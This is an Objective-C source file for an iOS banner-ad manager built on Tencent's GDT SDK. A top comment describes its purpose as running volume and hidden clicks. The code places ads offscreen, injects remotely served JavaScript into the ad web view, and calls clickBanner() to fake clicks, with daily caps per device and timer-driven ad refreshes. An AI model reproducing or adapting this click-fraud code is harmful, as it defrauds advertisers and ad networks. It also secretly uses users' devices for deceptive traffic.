//
//  GDTCpManager.m
//
//  Created by zengbiwang on 2017/6/27.
//
//

#import "GDTCpBannerManager.h"
#import "GDTMobBannerView.h"
#import "MajorSystemConfig.h"
#import "IQUIWindow+Hierarchy.h"
#import "CSPausibleTimer.h"
#import "AppDevice.h"
#import "GDtBannerRootCtrl.h"
#import "helpFuntion.h"
#import "AdvertGdtBannerManager.h"
#import "JsServiceManager.h"
//跑量和隐藏点击

_GDTClickState _click_banner_State = GDT_CLICK_unVaild;
static GDTCpBannerManager *g = NULL;
@interface GDTCpBannerManager()<GDTMobBannerViewDelegate>{
    GDTMobBannerView *_banner;     //原生广告实例
    BOOL _isAutoRefreshMode;
    BOOL _isCreateMaskView;
    BOOL _isClickBanner;
    BOOL _autoClick;
    
    BOOL _isPostNotitifiInterstitialManagerChangeID;
    BOOL _isReviceCheckNotifi;
    BOOL _isBannerViewWillExposure;
    BOOL _isClickInWillExposure;
}
@property(assign)BOOL isDelayClickState;//是否延迟加载的状态
@property(retain)CSPausibleTimer *maxClickOverTime;
@property(retain)CSPausibleTimer *chaoshiTimer;
@property(retain)CSPausibleTimer *updateTimer;//自动刷新
@property(retain)NSArray *_data;             //原生广告数据数组
@property(assign)UIViewController *rootCtrl;
@end
@implementation GDTCpBannerManager

+(GDTCpBannerManager*)getInstance{
    return NULL;
    if (!g) {
        g = [[GDTCpBannerManager alloc]init];
        if([MajorSystemConfig getInstance].appUserDebugAdID)
        {
            
            [MajorSystemConfig getInstance].gdtBannerAdInfo = [NSDictionary dictionaryWithObjectsAndKeys:@"1106553721",@"appkey",@"4000320828588698",@"placementId", nil];
        }
        
    }
    return g;
}

+(void)destoryInstance{
    [g unAllAsset];
    [g release];
    g = NULL;
}

-(void)unAllAsset{
    [[NSNotificationCenter defaultCenter]removeObserver:self];
    [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtBannerRootCtrl) startOrStopCheck:false];
    [self.updateTimer invalidate];self.updateTimer = nil;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    [self.maxClickOverTime invalidate];self.maxClickOverTime = nil;
    [self stopAutoRefreshTimer];
}

-(id)init{
    self = [super init];
    self.isDelayClickState = false;
    self.cpState = GDT_CpManager_FirstRequest;
    _isClickInWillExposure = _isReviceCheckNotifi = false;
    if ([MajorSystemConfig getInstance].isParallelClick) {
        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(checkBannerState) name:@"CheckBannerState" object:nil];
    }
    return self;
}

-(void)checkBannerState
{
    if (_isReviceCheckNotifi) {
        return;
    }
    _isReviceCheckNotifi = true;
    [self checkIt];
}

-(void)startAutoRefreshTimer{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    NSString *appKey = [[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"];
    if (appKey&&placementId && !_banner && self.rootCtrl) {
        _isAutoRefreshMode = true;
        [self addGDT:self.rootCtrl.view currentCtrl:self.rootCtrl appkey:appKey placementId:placementId];
    }
}

-(void)stopAutoRefreshTimer{
    _isAutoRefreshMode = false;
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    RemoveViewAndRelease(_banner);
}


-(void)addGDT:(UIView*)parentView currentCtrl:(UIViewController*)currentViwController appkey:(NSString*)appKey placementId:(NSString*)placementId{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    RemoveViewAndRelease(_banner)
    _autoClick = false;
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
        _banner = [[GDTMobBannerView alloc] initWithFrame:CGRectMake(0,10000,GDTMOB_AD_SUGGEST_SIZE_728x90.width,GDTMOB_AD_SUGGEST_SIZE_728x90.height)
                                                   appId:appKey placementId:placementId];
    } else {
        _banner = [[GDTMobBannerView alloc] initWithFrame:CGRectMake(0,10000,GDTMOB_AD_SUGGEST_SIZE_320x50.width,GDTMOB_AD_SUGGEST_SIZE_320x50.height)
                                                   appId:appKey placementId:placementId];
    }
    _banner.delegate = self;
    _banner.interval = 30;
    _banner.isGpsOn = false;
    if([MajorSystemConfig getInstance].isExcApla){
        _banner.currentViewController = [MajorSystemConfig getInstance].gdtBannerRootCtrl;
    }
    else{//
        _banner.currentViewController =  currentViwController;
    }
    [parentView addSubview:_banner];
    [_banner loadAdAndShow];
}

-(BOOL)showGDTCp:(UIView**)outView rootCtrl:(UIViewController*)rootCtrl{
    BOOL ret = false;//appkey placementId:placementId]
    NSString *appKey = [[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"];
    [self stopAutoRefreshTimer];
    [self.updateTimer invalidate];self.updateTimer = nil;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    if (!appKey) {
        [self maxClickOvertDelay];
        return false;
    }
    if (appKey&&placementId && !_banner) {
        self.rootCtrl = rootCtrl;
        _isAutoRefreshMode = false;
        [self addGDT:self.rootCtrl.view currentCtrl:[[UIApplication sharedApplication] keyWindow].rootViewController appkey:appKey placementId:placementId];
    }
    else{
        [MajorSystemConfig getInstance].is_qq_Apl = false;
    }
    
    if (![MajorSystemConfig getInstance].isParallelClick) {
        [self checkIt];
    }
    return ret;
}

-(void)checkIt{
    BOOL ret = false;
    if((![[AdvertGdtBannerManager getInstance] isCanAutoShow] ) || (!_isAutoRefreshMode && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView && ![[helpFuntion gethelpFuntion]isValideOneDayNotAutoAdd:eveyrDayClickGDTAdertTimes(([NSString stringWithFormat:@"%@%@",[[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"],[AppDevice getInstance].deviceUID])) nCount:[MajorSystemConfig getInstance].everyGDTDayTime isUseYYCache:false time:nil]))
    {
        _isCreateMaskView = true;
    }
    if (_banner && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView) {
        ret = true;
    }
    if(!ret)//本次启动已经自动点击，执行自动刷新广告
    {
        _isAutoRefreshMode = true;
        self.cpState = GDT_CpManager_AutoUpdate;
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
        [self maxClickOvertDelay];
    }
    else{//超时处理
        self.cpState = GDT_CpManager_FirstRequest;
        if(!self.chaoshiTimer){
            self.chaoshiTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtClickOvertime target:self selector:@selector(clickOvertime) userInfo:nil repeats:NO];
        }
        if ([MajorSystemConfig getInstance].isParallelClick) {
            if (_isBannerViewWillExposure) {
                [self checkIt2];
            }
            else{
                _isClickInWillExposure = true;
            }
        }
        else{
            _isClickInWillExposure = true;
        }
    }
}

-(void)maxClickOvertDelay
{
    [self.maxClickOverTime invalidate];
    self.maxClickOverTime = nil;
    if ([MajorSystemConfig getInstance].isParallelClick) {
        if(!_isPostNotitifiInterstitialManagerChangeID){
            NotitifiInterstitialState//直接通知切换
            _isPostNotitifiInterstitialManagerChangeID = true;
        }
    }
}

//点击操作在主线程中
-(void)checkIt2{
    UIApplicationState v = [UIApplication sharedApplication].applicationState;
    if([UIApplication sharedApplication].applicationState != UIApplicationStateActive)
        return;
    
    NSString *jsContent = [[JsServiceManager getInstance] getJsContent:GdtAdOperatJsKey];
    if(jsContent && (self.cpState != GDT_CpManager_AutoClickFaild) && (( !_isAutoRefreshMode && !_isClickBanner && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView) && [[AdvertGdtBannerManager getInstance] isCanAutoShow])){
        _isCreateMaskView = true;
        [[AdvertGdtBannerManager getInstance]initClickInfo];
        [[helpFuntion gethelpFuntion]isValideOneDay:eveyrDayClickGDTAdertTimes(([NSString stringWithFormat:@"%@%@",[[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"],[AppDevice getInstance].deviceUID])) nCount:[MajorSystemConfig getInstance].everyGDTDayTime isUseYYCache:false time:nil];
        
        if([NSThread isMainThread]){
            [self performSelector:@selector(randomClick) withObject:nil afterDelay:1];
        }
        else {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self performSelector:@selector(randomClick) withObject:nil afterDelay:1];
            });
        }
    }
}

-(void)clickOvertime
{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    self.cpState = GDT_CpManager_AutoClickFaild;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    [self autoUpdateTimeFun];
    if(!self.updateTimer){
        self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
    }
    [self maxClickOvertDelay];
    [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
}

-(void)autoUpdateTimeFun{
    NSString *appKey = [[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"];
    [self addGDT:self.rootCtrl.view currentCtrl:[[UIApplication sharedApplication] keyWindow].rootViewController appkey:appKey placementId:placementId];
}

-(void)stopGDTAndRemove{
    
}

-(void)stopIfisClick{
    if(_isAutoRefreshMode)return;
    RemoveViewAndRelease(_banner);
    [self startAutoRefreshTimer];
}

-(void)addJustBanner{
    
}

- (void)bannerViewDidReceived
{
    printf("BannerAdSuccessID = %s\n",[[[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"] UTF8String]);
}

- (void)bannerViewFailToReceived:(NSError *)error
{
    //[MobClick event:@"bannerFailToReceived"];
    printf("banner failed to Received : %s bannerid = %s\n",[[error description] UTF8String],[[[MajorSystemConfig getInstance].gdtBannerAdInfo objectForKey:@"placementId"] UTF8String]);
}

-(void)bannerViewWillExposure
{
    printf("banner bannerViewWillExposure :\n");
    _isBannerViewWillExposure = true;
    if (_isClickInWillExposure) {
        [self checkIt2];
    }
}

-(void)randomClick{
    if ([MajorSystemConfig getInstance].isParallelClick && !self.maxClickOverTime) {
        self.maxClickOverTime = [CSPausibleTimer scheduledTimerWithTimeInterval:15 target:self selector:@selector(maxClickOvertDelay) userInfo:nil repeats:NO];
    }
    //[MobClick event:@"bannerRandomClick"];
    if (![MajorSystemConfig getInstance].isDebugMode) {
        [self.chaoshiTimer resumeTimer];
        [self.updateTimer resumeTimer];
        if(!_isAutoRefreshMode && [MajorSystemConfig getInstance].is_qq_Apl){
            _click_banner_State = GDT_CLICK_Vaild;
            [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
            self.cpState = GDT_CpManager_AutoClickSuccess;
            NSArray *arraySubView = [_banner subviews];
            for (int i =0; i < arraySubView.count; i++) {
                id view =  [arraySubView objectAtIndex:i];
                if([view respondsToSelector:@selector(stringByEvaluatingJavaScriptFromString:)]){
                    NSString *tst = [[JsServiceManager getInstance] getJsContent:GdtAdOperatJsKey];
                    [view stringByEvaluatingJavaScriptFromString:tst];
                    [view stringByEvaluatingJavaScriptFromString:@"clickBanner()"];
                    _autoClick = true;
                    break;
                }
            }
        }
    }
}

- (void)bannerViewClicked
{
    //[MobClick event:@"bannerViewClicked"];
    printf("bannerViewClicked\n");
    if(_autoClick)
        [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtBannerRootCtrl) startOrStopCheck:true];
    _autoClick=false;
}

/**
 *  原生广告点击之后将要展示内嵌浏览器或应用内AppStore回调
 */
- (void)bannerViewDidPresentFullScreenModal{
    //[MobClick event:@"bannerPresentFullScreenModal"];
    printf("bannerViewDidPresentFullScreenModal\n");
}

- (void)bannerViewWillPresentFullScreenModal{
    printf("bannerViewWillPresentFullScreenModal\n");
}
- (void)bannerViewWillDismissFullScreenModal{
    printf("bannerViewWillDismissFullScreenModal\n");
}

- (void)bannerViewDidDismissFullScreenModal{
    //[MobClick event:@"bannerDismissFullScreenModal"];
    [self maxClickOvertDelay];
    if(self.cpState == GDT_CpManager_AutoClickSuccess){
        [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
        //开始自动刷新
        self.cpState = GDT_CpManager_AutoUpdate;
        [self autoUpdateTimeFun];
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    _click_banner_State = GDT_CLICK_unVaild;
}

/**
 *  原生广告点击之后应用进入后台时回调
 */
- (void)bannerViewWillLeaveApplication{
    [self maxClickOvertDelay];
    printf("bannerViewWillLeaveApplication\n");
    if(self.cpState == GDT_CpManager_AutoClickSuccess){
        self.cpState = GDT_CpManager_AutoUpdate;
        [self autoUpdateTimeFun];
        [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    _click_banner_State = GDT_CLICK_unVaild;
}
//end

@end





